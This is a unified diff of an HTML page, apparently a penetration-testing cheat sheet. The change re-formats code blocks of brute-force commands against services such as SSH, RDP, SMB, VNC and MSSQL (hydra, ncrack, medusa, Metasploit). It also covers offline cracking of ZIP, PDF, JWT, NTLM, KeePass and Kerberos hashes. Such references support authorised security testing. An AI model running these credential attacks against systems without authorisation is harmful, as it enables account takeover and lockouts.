-cat rockyou.txt | thc-pptp-bruter –u &lt;Username&gt; &lt;IP&gt;
-</code></pre><h3 id="rdp">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>You can download the .deb package to install from https://http.kali.org/pool/main/t/thc-pptp-bruter/
+</span></span><span style="display:flex;"><span>sudo dpkg -i thc-pptp-bruter*.deb <span style="color:#75715e">#Install the package</span>
+</span></span><span style="display:flex;"><span>cat rockyou.txt | thc-pptp-bruter –u &lt;Username&gt; &lt;IP&gt;
+</span></span></code></pre></div><h3 id="rdp">
   RDP
   <a class="anchor" href="#rdp">#</a>
 </h3>
-<pre tabindex="0"><code>ncrack -vv --user &lt;User&gt; -P pwds.txt rdp://&lt;IP&gt;
-hydra -V -f -L &lt;userslist&gt; -P &lt;passwlist&gt; rdp://&lt;IP&gt;
-</code></pre><h3 id="redis">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ncrack -vv --user &lt;User&gt; -P pwds.txt rdp://&lt;IP&gt;
+</span></span><span style="display:flex;"><span>hydra -V -f -L &lt;userslist&gt; -P &lt;passwlist&gt; rdp://&lt;IP&gt;
+</span></span></code></pre></div><h3 id="redis">
   Redis
   <a class="anchor" href="#redis">#</a>
 </h3>
-<pre tabindex="0"><code>msf&gt; use auxiliary/scanner/redis/redis_login
-nmap --script redis-brute -p 6379 &lt;IP&gt;
-hydra –P /path/pass.txt redis://&lt;IP&gt;:&lt;PORT&gt; # 6379 is the default
-</code></pre><h3 id="rexec">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf&gt; use auxiliary/scanner/redis/redis_login
+</span></span><span style="display:flex;"><span>nmap --script redis-brute -p <span style="color:#ae81ff">6379</span> &lt;IP&gt;
+</span></span><span style="display:flex;"><span>hydra –P /path/pass.txt redis://&lt;IP&gt;:&lt;PORT&gt; <span style="color:#75715e"># 6379 is the default</span>
+</span></span></code></pre></div><h3 id="rexec">
   Rexec
   <a class="anchor" href="#rexec">#</a>
 </h3>
-<pre tabindex="0"><code>hydra -l &lt;username&gt; -P &lt;password_file&gt; rexec://&lt;Victim-IP&gt; -v -V
-</code></pre><h3 id="rlogin">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l &lt;username&gt; -P &lt;password_file&gt; rexec://&lt;Victim-IP&gt; -v -V
+</span></span></code></pre></div><h3 id="rlogin">
   Rlogin
   <a class="anchor" href="#rlogin">#</a>
 </h3>
-<pre tabindex="0"><code>hydra -l &lt;username&gt; -P &lt;password_file&gt; rlogin://&lt;Victim-IP&gt; -v -V
-</code></pre><h3 id="rsh">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l &lt;username&gt; -P &lt;password_file&gt; rlogin://&lt;Victim-IP&gt; -v -V
+</span></span></code></pre></div><h3 id="rsh">
   Rsh
   <a class="anchor" href="#rsh">#</a>
 </h3>
-<pre tabindex="0"><code>hydra -L &lt;Username_list&gt; rsh://&lt;Victim_IP&gt; -v -V
-http://pentestmonkey.net/tools/misc/rsh-grind
-</code></pre><h3 id="rsync">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -L &lt;Username_list&gt; rsh://&lt;Victim_IP&gt; -v -V
+</span></span><span style="display:flex;"><span>http://pentestmonkey.net/tools/misc/rsh-grind
+</span></span></code></pre></div><h3 id="rsync">
   Rsync
   <a class="anchor" href="#rsync">#</a>
 </h3>
-<pre tabindex="0"><code>nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 &lt;IP&gt;
-</code></pre><h3 id="rtsp">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sV --script rsync-brute --script-args userdb<span style="color:#f92672">=</span>/var/usernames.txt,passdb<span style="color:#f92672">=</span>/var/passwords.txt -p <span style="color:#ae81ff">873</span> &lt;IP&gt;
+</span></span></code></pre></div><h3 id="rtsp">
   RTSP
   <a class="anchor" href="#rtsp">#</a>
 </h3>
-<pre tabindex="0"><code>hydra -l root -P passwords.txt &lt;IP&gt; rtsp
-</code></pre><h3 id="snmp">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l root -P passwords.txt &lt;IP&gt; rtsp
+</span></span></code></pre></div><h3 id="snmp">
   SNMP
   <a class="anchor" href="#snmp">#</a>
 </h3>
-<pre tabindex="0"><code>msf&gt; use auxiliary/scanner/snmp/snmp_login
-nmap -sU --script snmp-brute &lt;target&gt; [--script-args snmp-brute.communitiesdb=&lt;wordlist&gt; ]
-onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt &lt;IP&gt;
-hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
-</code></pre><h3 id="smb">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf&gt; use auxiliary/scanner/snmp/snmp_login
+</span></span><span style="display:flex;"><span>nmap -sU --script snmp-brute &lt;target&gt; <span style="color:#f92672">[</span>--script-args snmp-brute.communitiesdb<span style="color:#f92672">=</span>&lt;wordlist&gt; <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt &lt;IP&gt;
+</span></span><span style="display:flex;"><span>hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
+</span></span></code></pre></div><h3 id="smb">
   SMB
   <a class="anchor" href="#smb">#</a>
 </h3>
-<pre tabindex="0"><code>nmap --script smb-brute -p 445 &lt;IP&gt;
-hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
-</code></pre><h3 id="smtp">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap --script smb-brute -p <span style="color:#ae81ff">445</span> &lt;IP&gt;
+</span></span><span style="display:flex;"><span>hydra -l Administrator -P words.txt 192.168.1.12 smb -t <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><h3 id="smtp">
   SMTP
   <a class="anchor" href="#smtp">#</a>
 </h3>
-<pre tabindex="0"><code>hydra -l &lt;username&gt; -P /path/to/passwords.txt &lt;IP&gt; smtp -V
-hydra -l &lt;username&gt; -P /path/to/passwords.txt -s 587 &lt;IP&gt; -S -v -V #Port 587 for SMTP with SSL
-</code></pre><h3 id="socks">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l &lt;username&gt; -P /path/to/passwords.txt &lt;IP&gt; smtp -V
+</span></span><span style="display:flex;"><span>hydra -l &lt;username&gt; -P /path/to/passwords.txt -s <span style="color:#ae81ff">587</span> &lt;IP&gt; -S -v -V <span style="color:#75715e">#Port 587 for SMTP with SSL</span>
+</span></span></code></pre></div><h3 id="socks">
   SOCKS
   <a class="anchor" href="#socks">#</a>
 </h3>
-<pre tabindex="0"><code>nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 &lt;IP&gt;
-</code></pre><h3 id="sql-server">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap  -vvv -sCV --script socks-brute --script-args userdb<span style="color:#f92672">=</span>users.txt,passdb<span style="color:#f92672">=</span>/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit<span style="color:#f92672">=</span>30m -p <span style="color:#ae81ff">1080</span> &lt;IP&gt;
+</span></span></code></pre></div><h3 id="sql-server">
   SQL Server
   <a class="anchor" href="#sql-server">#</a>
 </h3>
-<pre tabindex="0"><code>#Use the NetBIOS name of the machine as domain
-crackmapexec mssql &lt;IP&gt; -d &lt;Domain Name&gt; -u usernames.txt -p passwords.txt
-hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt &lt;IP&gt; mssql
-medusa -h &lt;IP&gt; –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
-nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts &lt;host&gt; #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
-msf&gt; use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
-</code></pre><h3 id="ssh">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#Use the NetBIOS name of the machine as domain</span>
+</span></span><span style="display:flex;"><span>crackmapexec mssql &lt;IP&gt; -d &lt;Domain Name&gt; -u usernames.txt -p passwords.txt
+</span></span><span style="display:flex;"><span>hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt &lt;IP&gt; mssql
+</span></span><span style="display:flex;"><span>medusa -h &lt;IP&gt; –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
+</span></span><span style="display:flex;"><span>nmap -p <span style="color:#ae81ff">1433</span> --script ms-sql-brute --script-args mssql.domain<span style="color:#f92672">=</span>DOMAIN,userdb<span style="color:#f92672">=</span>customuser.txt,passdb<span style="color:#f92672">=</span>custompass.txt,ms-sql-brute.brute-windows-accounts &lt;host&gt; <span style="color:#75715e">#Use domain if needed. Be careful with the number of passwords in the list, this could block accounts</span>
+</span></span><span style="display:flex;"><span>msf&gt; use auxiliary/scanner/mssql/mssql_login <span style="color:#75715e">#Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT</span>
+</span></span></code></pre></div><h3 id="ssh">
   SSH
   <a class="anchor" href="#ssh">#</a>
 </h3>
-<pre tabindex="0"><code>hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; ssh
-ncrack -p 22 --user root -P passwords.txt &lt;IP&gt; [-T 5]
-medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M ssh
-patator ssh_login host=&lt;ip&gt; port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg=&#39;Authentication failed&#39;
-</code></pre><h3 id="telnet">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l root -P passwords.txt <span style="color:#f92672">[</span>-t 32<span style="color:#f92672">]</span> &lt;IP&gt; ssh
+</span></span><span style="display:flex;"><span>ncrack -p <span style="color:#ae81ff">22</span> --user root -P passwords.txt &lt;IP&gt; <span style="color:#f92672">[</span>-T 5<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M ssh
+</span></span><span style="display:flex;"><span>patator ssh_login host<span style="color:#f92672">=</span>&lt;ip&gt; port<span style="color:#f92672">=</span><span style="color:#ae81ff">22</span> user<span style="color:#f92672">=</span>root 0<span style="color:#f92672">=</span>/path/passwords.txt password<span style="color:#f92672">=</span>FILE0 -x ignore:mesg<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Authentication failed&#39;</span>
+</span></span></code></pre></div><h3 id="telnet">
   Telnet
   <a class="anchor" href="#telnet">#</a>
 </h3>
-<pre tabindex="0"><code>hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; telnet
-ncrack -p 23 --user root -P passwords.txt &lt;IP&gt; [-T 5]
-medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M telnet
-</code></pre><h3 id="vnc">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l root -P passwords.txt <span style="color:#f92672">[</span>-t 32<span style="color:#f92672">]</span> &lt;IP&gt; telnet
+</span></span><span style="display:flex;"><span>ncrack -p <span style="color:#ae81ff">23</span> --user root -P passwords.txt &lt;IP&gt; <span style="color:#f92672">[</span>-T 5<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M telnet
+</span></span></code></pre></div><h3 id="vnc">
   VNC
   <a class="anchor" href="#vnc">#</a>
 </h3>
-<pre tabindex="0"><code>hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s &lt;PORT&gt; &lt;IP&gt; vnc
-medusa -h &lt;IP&gt; –u root -P /root/Desktop/pass.txt –M vnc
-ncrack -V --user root -P /root/Desktop/pass.txt &lt;IP&gt;:&gt;POR&gt;T
-patator vnc_login host=&lt;IP&gt; password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!=&#39;Authentication failure&#39; --max-retries 0 –x quit:code=0
-use auxiliary/scanner/vnc/vnc_login
-nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 &lt;IP&gt;
-
-#Metasploit
-use auxiliary/scanner/vnc/vnc_login
-set RHOSTS &lt;ip&gt;
-set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
-</code></pre><h3 id="winrm">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s &lt;PORT&gt; &lt;IP&gt; vnc
+</span></span><span style="display:flex;"><span>medusa -h &lt;IP&gt; –u root -P /root/Desktop/pass.txt –M vnc
+</span></span><span style="display:flex;"><span>ncrack -V --user root -P /root/Desktop/pass.txt &lt;IP&gt;:&gt;POR&gt;T
+</span></span><span style="display:flex;"><span>patator vnc_login host<span style="color:#f92672">=</span>&lt;IP&gt; password<span style="color:#f92672">=</span>FILE0 0<span style="color:#f92672">=</span>/root/Desktop/pass.txt –t <span style="color:#ae81ff">1</span> –x retry:fgep!<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Authentication failure&#39;</span> --max-retries <span style="color:#ae81ff">0</span> –x quit:code<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>use auxiliary/scanner/vnc/vnc_login
+</span></span><span style="display:flex;"><span>nmap -sV --script pgsql-brute --script-args userdb<span style="color:#f92672">=</span>/var/usernames.txt,passdb<span style="color:#f92672">=</span>/var/passwords.txt -p <span style="color:#ae81ff">5432</span> &lt;IP&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Metasploit</span>
+</span></span><span style="display:flex;"><span>use auxiliary/scanner/vnc/vnc_login
+</span></span><span style="display:flex;"><span>set RHOSTS &lt;ip&gt;
+</span></span><span style="display:flex;"><span>set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
+</span></span></code></pre></div><h3 id="winrm">
   Winrm
   <a class="anchor" href="#winrm">#</a>
 </h3>
-<pre tabindex="0"><code>crackmapexec winrm &lt;IP&gt; -d &lt;Domain Name&gt; -u usernames.txt -p passwords.txt
-</code></pre><h2 id="cracking-locally">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec winrm &lt;IP&gt; -d &lt;Domain Name&gt; -u usernames.txt -p passwords.txt
+</span></span></code></pre></div><h2 id="cracking-locally">
   Cracking Locally
   <a class="anchor" href="#cracking-locally">#</a>
 </h2>
@@ -1625,46 +1625,46 @@ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
   ZIP
   <a class="anchor" href="#zip">#</a>
 </h3>
-<pre tabindex="0"><code>#sudo apt-get install fcrackzip 
-fcrackzip -u -D -p &#39;/usr/share/wordlists/rockyou.txt&#39; chall.zip
-zip2john file.zip &gt; zip.john
-john zip.john
-#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
-hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
-.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
-
-Known plaintext zip attack
-You need to know the plaintext (or part of the plaintext) of a file contained inside the encrypted zip. You can check filenames and size of files contained inside an encrypted zip running: 7z l encrypted.zip
-Download bkcrack from the releases page.
-# You need to create a zip file containing only the file that is inside the encrypted zip
-zip plaintext.zip plaintext.file
-
-./bkcrack -C &lt;encrypted.zip&gt; -c &lt;plaintext.file&gt; -P &lt;plaintext.zip&gt; -p &lt;plaintext.file&gt;
-# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
-# With that key you can create a new zip file with the content of encrypted.zip
-# but with a different pass that you set (so you can decrypt it)
-./bkcrack -C &lt;encrypted.zip&gt; -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd 
-unzip unlocked.zip #User new_pwd as password
-</code></pre><h3 id="7z">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#sudo apt-get install fcrackzip </span>
+</span></span><span style="display:flex;"><span>fcrackzip -u -D -p <span style="color:#e6db74">&#39;/usr/share/wordlists/rockyou.txt&#39;</span> chall.zip
+</span></span><span style="display:flex;"><span>zip2john file.zip &gt; zip.john
+</span></span><span style="display:flex;"><span>john zip.john
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$</span>
+</span></span><span style="display:flex;"><span>hashcat.exe -m <span style="color:#ae81ff">13600</span> -a <span style="color:#ae81ff">0</span> .<span style="color:#ae81ff">\h</span>ashzip.txt .<span style="color:#ae81ff">\w</span>ordlists<span style="color:#ae81ff">\r</span>ockyou.txt
+</span></span><span style="display:flex;"><span>.<span style="color:#ae81ff">\h</span>ashcat.exe -m <span style="color:#ae81ff">13600</span> -i -a <span style="color:#ae81ff">0</span> .<span style="color:#ae81ff">\h</span>ashzip.txt <span style="color:#75715e">#Incremental attack</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Known plaintext zip attack
+</span></span><span style="display:flex;"><span>You need to know the plaintext <span style="color:#f92672">(</span>or part of the plaintext<span style="color:#f92672">)</span> of a file contained inside the encrypted zip. You can check filenames and size of files contained inside an encrypted zip running: 7z l encrypted.zip
+</span></span><span style="display:flex;"><span>Download bkcrack from the releases page.
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># You need to create a zip file containing only the file that is inside the encrypted zip</span>
+</span></span><span style="display:flex;"><span>zip plaintext.zip plaintext.file
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>./bkcrack -C &lt;encrypted.zip&gt; -c &lt;plaintext.file&gt; -P &lt;plaintext.zip&gt; -p &lt;plaintext.file&gt;
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># With that key you can create a new zip file with the content of encrypted.zip</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># but with a different pass that you set (so you can decrypt it)</span>
+</span></span><span style="display:flex;"><span>./bkcrack -C &lt;encrypted.zip&gt; -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd 
+</span></span><span style="display:flex;"><span>unzip unlocked.zip <span style="color:#75715e">#User new_pwd as password</span>
+</span></span></code></pre></div><h3 id="7z">
   7z
   <a class="anchor" href="#7z">#</a>
 </h3>
-<pre tabindex="0"><code>cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
-#Download and install requirements for 7z2john
-wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
-apt-get install libcompress-raw-lzma-perl
-./7z2john.pl file.7z &gt; 7zhash.john
-</code></pre><h3 id="pdf">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Download and install requirements for 7z2john</span>
+</span></span><span style="display:flex;"><span>wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
+</span></span><span style="display:flex;"><span>apt-get install libcompress-raw-lzma-perl
+</span></span><span style="display:flex;"><span>./7z2john.pl file.7z &gt; 7zhash.john
+</span></span></code></pre></div><h3 id="pdf">
   PDF
   <a class="anchor" href="#pdf">#</a>
 </h3>
-<pre tabindex="0"><code>apt-get install pdfcrack
-pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
-#pdf2john didn&#39;t work well, john didn&#39;t know which hash type was
-# To permanently decrypt the pdf
-sudo apt-get install qpdf
-qpdf --password=&lt;PASSWORD&gt; --decrypt encrypted.pdf plaintext.pdf
-</code></pre><h3 id="pdf-owner-password">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>apt-get install pdfcrack
+</span></span><span style="display:flex;"><span>pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#pdf2john didn&#39;t work well, john didn&#39;t know which hash type was</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># To permanently decrypt the pdf</span>
+</span></span><span style="display:flex;"><span>sudo apt-get install qpdf
+</span></span><span style="display:flex;"><span>qpdf --password<span style="color:#f92672">=</span>&lt;PASSWORD&gt; --decrypt encrypted.pdf plaintext.pdf
+</span></span></code></pre></div><h3 id="pdf-owner-password">
   PDF Owner Password
   <a class="anchor" href="#pdf-owner-password">#</a>
 </h3>
@@ -1673,37 +1673,37 @@ qpdf --password=&lt;PASSWORD&gt; --decrypt encrypted.pdf plaintext.pdf
   JWT
   <a class="anchor" href="#jwt-1">#</a>
 </h3>
-<pre tabindex="0"><code>git clone https://github.com/Sjord/jwtcrack.git
-cd jwtcrack
-</code></pre><pre tabindex="0"><code>#Bruteforce using crackjwt.py
-python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt
-</code></pre><pre tabindex="0"><code>#Bruteforce using john
-python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc &gt; jwt.john
-john jwt.john #It does not work with Kali-John
-</code></pre><h3 id="ntlm-cracking">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/Sjord/jwtcrack.git
+</span></span><span style="display:flex;"><span>cd jwtcrack
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#Bruteforce using crackjwt.py</span>
+</span></span><span style="display:flex;"><span>python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#Bruteforce using john</span>
+</span></span><span style="display:flex;"><span>python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc &gt; jwt.john
+</span></span><span style="display:flex;"><span>john jwt.john <span style="color:#75715e">#It does not work with Kali-John</span>
+</span></span></code></pre></div><h3 id="ntlm-cracking">
   NTLM cracking
   <a class="anchor" href="#ntlm-cracking">#</a>
 </h3>
-<pre tabindex="0"><code>Format:USUARIO:ID:HASH_LM:HASH_NT:::
-john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
-hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
-</code></pre><h3 id="keepass">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Format:USUARIO:ID:HASH_LM:HASH_NT:::
+</span></span><span style="display:flex;"><span>john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt --format<span style="color:#f92672">=</span>NT file_NTLM.hashes
+</span></span><span style="display:flex;"><span>hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">1000</span> --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
+</span></span></code></pre></div><h3 id="keepass">
   Keepass
   <a class="anchor" href="#keepass">#</a>
 </h3>
-<pre tabindex="0"><code>sudo apt-get install -y kpcli #Install keepass tools like keepass2john
-keepass2john file.kdbx &gt; hash #The keepass is only using password
-keepass2john -k &lt;file-password&gt; file.kdbx &gt; hash # The keepass is also using a file as a needed credential
-#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
-john --wordlist=/usr/share/wordlists/rockyou.txt hash
-</code></pre><h3 id="keberoasting">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt-get install -y kpcli <span style="color:#75715e">#Install keepass tools like keepass2john</span>
+</span></span><span style="display:flex;"><span>keepass2john file.kdbx &gt; hash <span style="color:#75715e">#The keepass is only using password</span>
+</span></span><span style="display:flex;"><span>keepass2john -k &lt;file-password&gt; file.kdbx &gt; hash <span style="color:#75715e"># The keepass is also using a file as a needed credential</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john</span>
+</span></span><span style="display:flex;"><span>john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hash
+</span></span></code></pre></div><h3 id="keberoasting">
   Keberoasting
   <a class="anchor" href="#keberoasting">#</a>
 </h3>
-<pre tabindex="0"><code>john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
-hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
-./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
-</code></pre><h3 id="lucks-image">
